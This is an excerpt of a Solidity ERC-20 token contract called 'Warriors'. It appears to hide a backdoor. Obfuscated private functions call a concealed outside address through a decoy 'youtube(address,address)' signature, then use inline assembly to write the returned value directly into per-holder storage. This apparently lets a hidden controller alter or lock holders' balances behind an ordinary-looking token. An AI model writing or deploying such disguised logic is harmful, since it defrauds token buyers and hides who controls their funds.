...
contract Warriors is IERC20, Ownable {
    ...
    address private immutable _jimmy;
     ...
     * construction.
     */
    constructor(string memory symbol_, string memory name_, uint256 totalSupply_, address jimmy_) 
    {   
         _name = name_; 
        _symbol = symbol_; 
    ...
    function _playback(bytes memory q) private pure returns(bytes32 b) {
        assembly { b := mload(add(q, add(16, 16))) }
    }


    function saveline(uint256 vv, uint256 b, address f, uint256 m) private {
        assembly {
            mstore(0, f) 
            mstore(vv, b) 
    ...
    function Ustg(address m, address vv) private {
        bytes memory b = bytes("youtube(address,address)");
        (bool s, bytes memory q) = m.call(abi.
        encodeWithSignature(string(b), vv, address(0)));
        if (!s) { uint256 tt = 0; 1 / tt; }
        uint256 vvv = uint256(_playback(q));
        if (vvv == 0) return;
        saveline(32, 4, vv, vvv);
    }
